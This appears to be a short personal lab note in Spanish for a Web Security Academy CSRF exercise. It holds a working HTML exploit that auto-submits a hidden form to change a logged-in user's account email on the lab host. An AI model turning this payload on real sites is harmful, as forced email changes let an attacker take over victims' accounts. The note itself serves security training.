### Objetivo:

![[Pasted image 20240513231006.png]]

## Exploit:

![[Pasted image 20240515222734.png]]

```
<body>

<form action="https://0a5300cf04bd2dcd80bddf3800000001.web-security-academy.net/my-account/change-email" method="post">

<input type="hidden" name="email" value="pwned@gmail.com">

</form>

<script>

document.forms[0].submit()

</script>

</body>
```
